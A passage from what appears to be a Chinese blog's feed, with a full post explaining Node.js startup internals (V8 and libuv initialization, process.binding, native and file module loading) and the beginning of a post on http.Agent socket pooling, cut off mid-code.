    <content type="html"><![CDATA[<p>当我们运行<code>node app.js</code>的时候都发生了什么？<code>process</code>的初始化，模块系统的形成，C/C++与js的结合等等。从源头出发，探索背后的奥秘。<br><a id="more"></a></p><h2 id="启动及初始化操作"><a href="#启动及初始化操作" class="headerlink" title="启动及初始化操作"></a>启动及初始化操作</h2><p><code>node_main.cc</code>是node的入口，根据操作系统做一些初始化工作，最后调用<code>node::Start()</code></p><p>在<code>node.cc</code>里定义了<code>Start()</code>,做了一些初始化platform,V8初始化，libuv event loop创建等工作，然后调用第一个<code>inline Start()</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> exit_code =</span><br><span class="line">    Start(uv_default_loop(), argc, argv, exec_argc, exec_argv);</span><br></pre></td></tr></table></figure></p><p>在在第一个<code>inline Start()</code>里，起一个V8实例，并调用最后一个<code>inline Start()</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Isolate* <span class="keyword">const</span> isolate = Isolate::New(params);</span><br><span class="line">...</span><br><span class="line">exit_code = Start(isolate, &amp;isolate_data, argc, argv, exec_argc, exec_argv);</span><br></pre></td></tr></table></figure><p>接着在最后一个Start()里，初始化context,新建一个env，env用于将<code>libuv</code>和<code>v8</code>结合在一起:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HandleScope <span class="title">handle_scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line"> Local&lt;Context&gt; context = Context::New(isolate);</span><br><span class="line"> Context::<span class="function">Scope <span class="title">context_scope</span><span class="params">(context)</span></span>;</span><br><span class="line"> <span class="function">Environment <span class="title">env</span><span class="params">(isolate_data, context)</span></span>;</span><br><span class="line"> ...</span><br><span class="line"> env.Start(argc, argv, exec_argc, exec_argv, v8_is_profiling);</span><br></pre></td></tr></table></figure></p><p>这里调用了<code>env.Start();</code>，<code>env.Start()</code>定义在<code>env.cc</code>里,该方法里面调用了<code>SetupProcessObject(this, argc, argv, exec_argc, exec_argv);</code>，而该方法又定义在<code>node.cc</code>里，定义了<code>process</code>的一些属性和方法(其中包括了<code>process.binding()</code>用于C/C++模块机制，后面详解):</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/setupProcessObject.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/setupProcessObject.png"></p><p>最后一个<code>inline Start()</code>还进入了一个while循环处理<code>libuv</code>事件:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">      v8_platform.PumpMessageLoop(isolate);</span><br><span class="line">      more = uv_run(env.event_loop(), UV_RUN_ONCE);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="literal">false</span>) &#123;</span><br><span class="line">        v8_platform.PumpMessageLoop(isolate);</span><br><span class="line">        EmitBeforeExit(&amp;env);</span><br><span class="line">        more = uv_loop_alive(env.event_loop());</span><br><span class="line">        <span class="keyword">if</span> (uv_run(env.event_loop(), UV_RUN_NOWAIT) != <span class="number">0</span>)</span><br><span class="line">          more = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (more == <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>另外还调用了<code>LoadEnvironment(&amp;env);</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Local&lt;String&gt; script_name = FIXED_ONE_BYTE_STRING(env-&gt;isolate(),</span><br><span class="line">                                                    <span class="string">"bootstrap_node.js"</span>);</span><br><span class="line">Local&lt;Value&gt; f_value = ExecuteString(env, MainSource(env), script_name);</span><br></pre></td></tr></table></figure><p>其中<code>MainSource(env)</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Local&lt;String&gt; MainSource(Environment* env) &#123;</span><br><span class="line">  <span class="keyword">return</span> String::NewFromUtf8(</span><br><span class="line">      env-&gt;isolate(),</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(internal_bootstrap_node_native),</span><br><span class="line">      NewStringType::kNormal,</span><br><span class="line">      <span class="keyword">sizeof</span>(internal_bootstrap_node_native)).ToLocalChecked();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这里的<code>internal_bootstrap_node_native</code>由<code>node_natives.h</code>定义，这个头文件是由<code>js2c.py</code>工具生成的，将所有native模块都编译到C++数组里:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/node_natives.h.bootstrap.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/node_natives.h.bootstrap.png"><br>执行<code>bootstrap_node.js</code>的匿名函数并传入<code>process</code>对象,<code>process</code>对象通过<code>env-&gt;process_object()</code>获得：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Local&lt;Function&gt; f = Local&lt;Function&gt;::Cast(f_value);</span><br><span class="line">...</span><br><span class="line">Local&lt;Value&gt; arg = env-&gt;process_object();</span><br><span class="line">f-&gt;Call(Null(env-&gt;isolate()), <span class="number">1</span>, &amp;arg);</span><br></pre></td></tr></table></figure><p>在<code>bootstrap_node.js</code>初始化了一些process方法和属性，global变量，模块机制等。</p><h2 id="执行一个js文件"><a href="#执行一个js文件" class="headerlink" title="执行一个js文件"></a>执行一个js文件</h2><p>为了说明一个运行一个js文件发生了什么，先说明一下模块系统的初始化</p><h3 id="模块系统形成"><a href="#模块系统形成" class="headerlink" title="模块系统形成"></a>模块系统形成</h3><h4 id="process-binding-C-C-内建模块"><a href="#process-binding-C-C-内建模块" class="headerlink" title="process.binding() C/C++内建模块"></a>process.binding() C/C++内建模块</h4><p>上面我们说在程序启动后会在<code>SetupProcessObject()</code>里为<code>process</code>对象绑定一些方法，其中就包括<code>process.binding</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cache-&gt;Has(env-&gt;context(), <span class="keyword">module</span>).FromJust()) &#123;</span><br><span class="line">    exports = cache-&gt;Get(<span class="keyword">module</span>)-&gt;ToObject(env-&gt;isolate());</span><br><span class="line">    args.GetReturnValue().Set(exports);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">node_module* mod = get_builtin_module(*module_v);</span><br><span class="line"><span class="keyword">if</span> (mod != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    exports = Object::New(env-&gt;isolate());</span><br><span class="line">    CHECK_EQ(mod-&gt;nm_register_func, <span class="literal">nullptr</span>);</span><br><span class="line">    CHECK_NE(mod-&gt;nm_context_register_func, <span class="literal">nullptr</span>);</span><br><span class="line">    Local&lt;Value&gt; unused = Undefined(env-&gt;isolate());</span><br><span class="line">    mod-&gt;nm_context_register_func(exports, unused,</span><br><span class="line">        env-&gt;context(), mod-&gt;nm_priv);</span><br><span class="line">    cache-&gt;Set(<span class="keyword">module</span>, exports);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ...</span><br></pre></td></tr></table></figure></p><p>其中<code>get_builtin_module(*module_v);</code>在<code>modlist_builtin</code>链表中获取模块。同样用了缓存机制。那么这些C/C++模块是怎么放到链表上面去的呢？答案是通过<code>NODE_MODULE_CONTEXT_AWARE_BUILTIN</code>，比如<code>zlib</code>调用了<code>NODE_MODULE_CONTEXT_AWARE_BUILTIN(zlib, node::InitZlib)</code>来将该模块加入到上边儿的链表中。</p><p>我们在<code>node.h</code>看到了这个宏定义:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NODE_MODULE_CONTEXT_AWARE_BUILTIN(modname, regfunc)           \</span></span><br><span class="line">  NODE_MODULE_CONTEXT_AWARE_X(modname, regfunc, <span class="literal">NULL</span>, NM_F_BUILTIN)</span><br></pre></td></tr></table></figure></p><p>而<code>NODE_MODULE_CONTEXT_AWARE_X</code>最终会调用<code>node.cc</code>里定义的<code>node_module_register(&amp;_module);</code>将C/C++模块加入到<code>modlist_builtin</code>链表中，供<code>get_builtin_module()</code>使用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">void</span> <span class="title">node_module_register</span><span class="params">(<span class="keyword">void</span>* m)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">node_module</span>* <span class="title">mp</span> = <span class="title">reinterpret_cast</span>&lt;struct node_module*&gt;(<span class="title">m</span>);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mp-&gt;nm_flags &amp; NM_F_BUILTIN) &#123;</span><br><span class="line">    mp-&gt;nm_link = modlist_builtin;</span><br><span class="line">    modlist_builtin = mp;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!node_is_initialized) &#123;</span><br><span class="line">    mp-&gt;nm_flags = NM_F_LINKED;</span><br><span class="line">    mp-&gt;nm_link = modlist_linked;</span><br><span class="line">    modlist_linked = mp;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    modpending = mp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="native-js模块"><a href="#native-js模块" class="headerlink" title="native js模块"></a>native js模块</h4><p>在<code>bootstrap_node.js</code>里：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NativeModule._source = process.binding(<span class="string">'natives'</span>);</span><br><span class="line">NativeModule._cache = &#123;&#125;;</span><br></pre></td></tr></table></figure></p><p>当调用<code>process.binding(&#39;natives&#39;);</code>的时候，<code>node.cc</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(*module_v, <span class="string">"natives"</span>)) &#123;</span><br><span class="line">    exports = Object::New(env-&gt;isolate());</span><br><span class="line">    DefineJavaScript(env, exports);</span><br><span class="line">    cache-&gt;Set(<span class="keyword">module</span>, exports);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>src/node_javascript.cc</code>中关于<code>DefineJavaScript()</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DefineJavaScript</span><span class="params">(Environment* env, Local&lt;Object&gt; target)</span> </span>&#123;</span><br><span class="line">  HandleScope scope(env-&gt;isolate());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> native : natives) &#123;</span><br><span class="line">    <span class="keyword">if</span> (native.source != internal_bootstrap_node_native) &#123;</span><br><span class="line">      Local&lt;String&gt; name = String::NewFromUtf8(env-&gt;isolate(), native.name);</span><br><span class="line">      Local&lt;String&gt; source =</span><br><span class="line">          String::NewFromUtf8(</span><br><span class="line">              env-&gt;isolate(), <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(native.source),</span><br><span class="line">              NewStringType::kNormal, native.source_len).ToLocalChecked();</span><br><span class="line">      target-&gt;Set(name, source);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而上面的<code>natives</code>就是在<code>node_natives.h</code>里边儿定义的：</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/node_natives.h.natives.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/node_natives.h.natives.png"></p><p>对于<code>require</code>同样使用了cache机制:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cached = NativeModule.getCached(id);</span><br><span class="line">    <span class="keyword">if</span> (cached &amp;&amp; (cached.loaded || cached.loading)) &#123;</span><br><span class="line">      <span class="keyword">return</span> cached.exports;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>最终调用<code>compile()</code>方法:<br>对源码用<code>wrapper</code>进行了包装:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> source = NativeModule.getSource(<span class="keyword">this</span>.id);</span><br><span class="line">source = NativeModule.wrap(source);</span><br></pre></td></tr></table></figure></p><p>然后在vm里执行，并传入一些包装后匿名函数需要的参数:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fn = runInThisContext(source, &#123;</span><br><span class="line">    filename: <span class="keyword">this</span>.filename,</span><br><span class="line">    lineOffset: <span class="number">0</span>,</span><br><span class="line">    displayErrors: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line">fn(<span class="keyword">this</span>.exports, NativeModule.require, <span class="keyword">this</span>, <span class="keyword">this</span>.filename);</span><br></pre></td></tr></table></figure></p><p>这样我们就可以来理解执行一个文件的过程:</p><h3 id="执行一个js文件（文件模块）"><a href="#执行一个js文件（文件模块）" class="headerlink" title="执行一个js文件（文件模块）"></a>执行一个js文件（文件模块）</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = NativeModule.require(<span class="string">'path'</span>);</span><br><span class="line">process.argv[<span class="number">1</span>] = path.resolve(process.argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Module = NativeModule.require(<span class="string">'module'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process._syntax_check_only != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fs = NativeModule.require(<span class="string">'fs'</span>);</span><br><span class="line">    <span class="keyword">const</span> filename = Module._resolveFilename(process.argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> source = fs.readFileSync(filename, <span class="string">'utf-8'</span>);</span><br><span class="line">    checkScriptSyntax(source, filename);</span><br><span class="line">    process.exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preloadModules();</span><br><span class="line">Module.runMain();</span><br></pre></td></tr></table></figure><p>同步读取执行的js文件,<code>lib/module.js</code>中的<code>runMain()</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Module.runMain = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  Module._load(process.argv[<span class="number">1</span>], <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">  process._tickCallback();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>Module._load:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Module._load = <span class="function"><span class="keyword">function</span>(<span class="params">request, parent, isMain</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">    debug(<span class="string">'Module._load REQUEST %s parent: %s'</span>, request, parent.id);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> filename = Module._resolveFilename(request, parent, isMain);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> cachedModule = Module._cache[filename];</span><br><span class="line">  <span class="keyword">if</span> (cachedModule) &#123;</span><br><span class="line">    <span class="keyword">return</span> cachedModule.exports;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (NativeModule.nonInternalExists(filename)) &#123;</span><br><span class="line">    debug(<span class="string">'load native module %s'</span>, request);</span><br><span class="line">    <span class="keyword">return</span> NativeModule.require(filename);</span><br><span class="line">  &#125; <span class="comment">//如果在native模块里找到就调用NativeModule的require机制</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="built_in">module</span> = <span class="keyword">new</span> Module(filename, parent);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isMain) &#123;</span><br><span class="line">    process.mainModule = <span class="built_in">module</span>;</span><br><span class="line">    <span class="built_in">module</span>.id = <span class="string">'.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Module._cache[filename] = <span class="built_in">module</span>;</span><br><span class="line"></span><br><span class="line">  tryModuleLoad(<span class="built_in">module</span>, filename);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>Module._resolveFilename()</code>经过一系列的查找机制（包括后缀扩展，包查找等）后，得到一个合适的<code>filename</code>，<code>tryModuleLoad()</code>里会调用<code>Module.load()</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> extension = path.extname(filename) || <span class="string">'.js'</span>;</span><br><span class="line"><span class="keyword">if</span> (!Module._extensions[extension]) extension = <span class="string">'.js'</span>;</span><br><span class="line">Module._extensions[extension](<span class="keyword">this</span>, filename);</span><br><span class="line"><span class="keyword">this</span>.loaded = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></p><p>对于js文件调用<code>_compile()</code>方法:</p><p>同样进行了包装（包装方法和内容和NativeModule相同)，并传入自己的参数在vm里执行代码:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">content = internalModule.stripShebang(content);</span><br><span class="line"><span class="keyword">var</span> wrapper = Module.wrap(content);</span><br><span class="line"><span class="keyword">var</span> compiledWrapper = vm.runInThisContext(wrapper, &#123;</span><br><span class="line">    filename: filename,</span><br><span class="line">    lineOffset: <span class="number">0</span>,</span><br><span class="line">    displayErrors: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line">...</span><br><span class="line">result = inspectorWrapper(compiledWrapper, <span class="keyword">this</span>.exports, <span class="keyword">this</span>.exports,</span><br><span class="line"><span class="built_in">require</span>, <span class="keyword">this</span>, filename, dirname);</span><br></pre></td></tr></table></figure></p><p>而传入的<code>require</code>就是传入的<code>Module.prototype.require()</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Module.prototype.require = <span class="function"><span class="keyword">function</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">  assert(path, <span class="string">'missing path'</span>);</span><br><span class="line">  assert(<span class="keyword">typeof</span> path === <span class="string">'string'</span>, <span class="string">'path must be a string'</span>);</span><br><span class="line">  <span class="keyword">return</span> Module._load(path, <span class="keyword">this</span>, <span class="comment">/* isMain */</span> <span class="literal">false</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>可见最终又是走<code>_load</code>。这其实是文件模块（第三方和自定义模块）的加载方式，而用node执行一个js文件，实际上用到的也就是这种文件模块的机制，不过多了一系列的启动操作。</p><p>可以分析得到，执行一个js文件时，会去初始化<code>process</code>，其中包括定义了<code>process.binding()</code>方法来定义<code>C/C++</code>模块机制，然后会去执行一个native模块即<code>bootstrap_node.js</code>，它的代码放在了<code>node_natives.h</code>里，从那里读取code array,在C++层面运行即调用了<code>bootstrap_node.js</code>的匿名函数并传入<code>process</code>对象，在<code>bootstrap_node.js</code>里，定义了native js模块机制，即通过<code>process.binding(&#39;natives)</code>得到<code>node_natives.h</code>里的<code>natives</code>数组，包含了所有native模块的代码数组。然后对于执行一个js文件，调用原生模块<code>module</code>，去执行<code>Module.runMain()</code>，而这个操作不过是由<code>module</code>定义的文件模块机制罢了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>文章从node启动到一个js文件的执行的角度去分析内部原理，详细解释了与<code>process</code>对象有关和模块系统的形成。而对于其他细节诸如<code>libuv event loop</code>机制还需要深究，会在后面的文章中进行总结。欢迎讨论。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当我们运行&lt;code&gt;node app.js&lt;/code&gt;的时候都发生了什么？&lt;code&gt;process&lt;/code&gt;的初始化，模块系统的形成，C/C++与js的结合等等。从源头出发，探索背后的奥秘。&lt;br&gt;
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="process" scheme="http://luoxia.me/code/tags/process/"/>
    
      <category term="v8" scheme="http://luoxia.me/code/tags/v8/"/>
    
      <category term="模块系统" scheme="http://luoxia.me/code/tags/%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>聊聊Agent/Proxy</title>
    <link href="http://luoxia.me/code/2017/07/16/%E8%81%8A%E8%81%8AAgent&amp;Proxy/"/>
    <id>http://luoxia.me/code/2017/07/16/聊聊Agent&amp;Proxy/</id>
    <published>2017-07-16T13:59:39.000Z</published>
    <updated>2017-11-16T13:10:06.492Z</updated>
    
    <content type="html"><![CDATA[<p>聊聊Agent/Proxy，以Node为例，看看<code>ClientRequest</code>是如何通过<code>http.Agent</code>去管理socket池，用Node写http/https proxy,再自定义Agent并在Agent与目标源之间加入Node proxy。</p><a id="more"></a><h2 id="http-Agent"><a href="#http-Agent" class="headerlink" title="http.Agent"></a>http.Agent</h2><p>首先<code>addRequest()</code>方法是入口，<code>http_client</code>发请求前会判断是否有agent,如果有，则会调用agent的<code>addRequest()</code>方法:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.agent) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.agent.keepAlive &amp;&amp; !<span class="built_in">Number</span>.isFinite(<span class="keyword">this</span>.agent.maxSockets)) &#123;</span><br><span class="line">      <span class="keyword">this</span>._last = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">this</span>.shouldKeepAlive = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>._last = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">this</span>.shouldKeepAlive = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.agent.addRequest(<span class="keyword">this</span>, options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后我们来看看官方的<code>http.Agent</code>做法:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="keyword">this</span>.getName(options);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.sockets[name]) &#123;</span><br><span class="line"><span class="keyword">this</span>.sockets[name] = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> freeLen = <span class="keyword">this</span>.freeSockets[name] ? <span class="keyword">this</span>.freeSockets[name].length : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> sockLen = freeLen + <span class="keyword">this</span>.sockets[name].length;</span><br></pre></td></tr></table></figure></p><p>我们看到<code>this.sockets[name]</code>表示了某个host请求正在处理请求的sockets数组，<code>this.freeSockets[name]</code>则表示某个host请求处于free状态下的sockets，两者数量之和的上限就是我们传给<code>new http.Agent()</code>构造函数options中的<code>maxSockets</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (freeLen) &#123;</span><br><span class="line">    <span class="keyword">var</span> socket = <span class="keyword">this</span>.freeSockets[name].shift();</span><br><span class="line">    socket._handle.asyncReset();</span><br><span class="line">    socket[async_id_symbol] = socket._handle.getAsyncId();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.freeSockets[name].length)</span><br><span class="line">      <span class="keyword">delete</span> <span class="keyword">this</span>.freeSockets[name];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.reuseSocket(socket, req);</span><br><span class="line">    req.onSocket(socket);</span><br><span class="line">    <span class="keyword">this</span>.sockets[name].push(socket);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sockLen &lt; <span class="keyword">this</span>.maxSockets) &#123;</span><br><span class="line">    debug(<span class="string">'call onSocket'</span>, sockLen, freeLen);</span><br><span class="line">    <span class="keyword">this</span>.createSocket(req, options, handleSocketCreation(req, <span class="literal">true</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    debug(<span class="string">'wait for socket'</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.requests[name]) &#123;</span><br><span class="line">      <span class="keyword">this</span>.requests[name] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.requests[name].push(req);</span><br><span class="line">  